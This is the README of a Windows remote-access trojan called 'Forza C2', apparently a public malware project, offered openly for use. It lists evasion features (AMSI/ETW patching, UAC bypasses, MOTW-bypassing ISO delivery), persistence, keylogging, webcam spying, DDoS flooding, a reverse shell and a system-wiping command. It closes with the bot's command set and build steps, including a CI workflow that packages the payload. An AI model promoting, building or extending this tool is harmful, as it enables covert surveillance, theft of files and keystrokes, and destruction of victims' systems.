# Forza C2

Windows RAT with Telegram C2, written in Go (standalone .exe, zero deps).

## Features

- Telegram Bot API command channel (long-poll, no delay)
- ETW/AMSI patching on load
- Early-bird APC injection
- Dual UAC bypass (Fodhelper + CMSTP)
- 11-persistence methods (registry, schtasks, WMI, COM, service, guardian, etc.)
- XOR-encrypted config at rest
- Keylogger (global WH_KEYBOARD_LL hook)
- Webcam capture via WIA COM
- Multi-vector DDoS (TCP+UDP+HTTP, auto-probes live ports)
- Input blocking
- Screenshot capture
- File upload/download
- On-demand reverse shell (PowerShell, AMSI-bypassed)
- TLS reverse shell fallback
- Hard-reset system nuke
- ISO delivery (MOTW bypass)
- GitHub Actions CI/CD

## Commands

```
!shell <cmd>       Execute command (60s timeout)
!upload <path>     Exfiltrate file (max 50MB)
!download <url>    Download file from URL
!screenshot        Capture screen (PNG)
!inject <proc>     APC inject into process
!rev <host>:<port> Reverse shell (PS)
!keys              Keylog exfil
!msg <text>        Popup message
!blockinput        Lock input (toggle)
!sysinfo           System info
!ddos <host>       Multi-vector flood (probes live ports)
!ddos_stop         Stop flood
!start_web <sec>   Webcam capture loop
!stop_web          Stop webcam
!kill              Self-destruct (clean persistence)
!fcku              Nuke system (hard reset required)
!logs              Last 20 log lines
!whoami            Current user
!ip                Local IP
!uptime            Process uptime
!help              This list
```

## Build

```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H=windowsgui" -o output.exe .
```

Or use GitHub Actions: go to Actions → Run workflow → enter bot token/chat ID → download ISO.
